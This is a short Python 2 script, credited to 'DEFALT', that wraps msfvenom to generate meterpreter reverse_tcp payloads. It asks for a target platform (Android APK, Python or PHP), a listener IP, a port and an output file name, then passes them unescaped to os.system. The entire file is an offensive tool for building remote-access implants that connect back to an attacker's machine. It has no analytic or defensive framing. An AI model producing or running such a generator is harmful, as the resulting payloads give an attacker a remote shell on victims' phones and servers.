import os,sys

os.system ("clear")
os.system ("figlet Generate Payload")
print
print
la = raw_input ("android(apk)/python/php : ")
ip = raw_input ("IP : ")
port = raw_input ("Port : ")
out = raw_input ("Output : ")
os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (la, ip, port, out))
print
print
print "\033[1m\033[32m Programing By DEFALT"
print
print "\033[0m"
